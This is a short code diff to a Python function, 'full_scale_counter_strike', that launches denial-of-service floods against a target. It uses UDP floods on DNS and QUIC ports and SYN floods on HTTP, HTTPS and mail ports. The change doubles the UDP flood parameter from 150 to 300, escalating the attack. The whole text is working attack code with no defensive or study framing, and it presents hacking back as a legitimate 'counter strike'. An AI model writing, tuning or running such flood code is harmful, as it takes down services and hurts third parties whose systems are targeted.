@@ -1,7 +1,7 @@
 import counter_strike_helper
 def full_scale_counter_strike(target):
-    counter_strike_helper.attack_UDP("UDP-Mix",target,53,150) # DNS
-    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 150) # QUIC
+    counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
+    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
     counter_strike_helper.synflood(target,80,200) # HTTP
     counter_strike_helper.synflood(target, 443, 200) # HTTPS
     counter_strike_helper.synflood(target, 25, 200) # Email
